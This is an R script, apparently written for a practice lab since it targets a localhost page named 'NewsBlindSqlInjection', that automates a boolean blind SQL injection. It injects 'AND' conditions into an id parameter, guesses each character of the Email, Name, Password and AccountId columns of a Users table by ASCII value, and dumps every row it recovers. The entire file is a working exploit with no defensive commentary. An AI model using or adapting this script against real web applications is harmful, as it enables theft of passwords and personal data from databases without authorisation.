#Script3.R
library(httr)

# Configuración de la URL base
base_url <- "http://localhost:44367/News/NewsBlindSqlInjection?id="

# Definir las columnas que se desean extraer
columns <- c("Email", "Name", "Password", "AccountId")

# Función para verificar si la condición es verdadera
is_true <- function(query) {
  # Crear la URL con la inyección
  url <- paste0(base_url, URLencode(paste0("1 AND ", query)))
  response <- GET(url)
  content <- content(response, "text", encoding = "UTF-8")
  
  # Verificar si el contenido indica que la condición es verdadera
  return(!grepl("No se encontraron noticias", content))
}

# Función para extraer un valor específico
extract_value <- function(column, row) {
  value <- ""
  char_index <- 1
  repeat {
    char_found <- FALSE
    for (ascii_code in 32:126) { # Rango de caracteres imprimibles ASCII
      query <- sprintf(
        "ASCII(SUBSTRING((SELECT %s FROM Users ORDER BY Email OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY), %d, 1)) = %d",
        column, row, char_index, ascii_code
      )
      if (is_true(query)) {
        value <- paste0(value, intToUtf8(ascii_code))
        char_index <- char_index + 1
        char_found <- TRUE
        break
      }
    }
    if (!char_found) break
  }
  return(value)
}

# Función para extraer todos los datos de la tabla
extract_table <- function() {
  results <- list()
  row_index <- 0
  repeat {
    row_data <- list()
    for (column in columns) {
      message(sprintf("Extrayendo columna '%s' de la fila %d...", column, row_index + 1))
      value <- extract_value(column, row_index)
      if (value == "") {
        return(results) # Detener cuando no hay más filas
      }
      row_data[[column]] <- value
    }
    results <- append(results, list(row_data))
    row_index <- row_index + 1
  }
}

# Ejecutar el script
message("Iniciando extracción de datos de la tabla Users...")
data <- extract_table()

# Mostrar resultados
print(data)
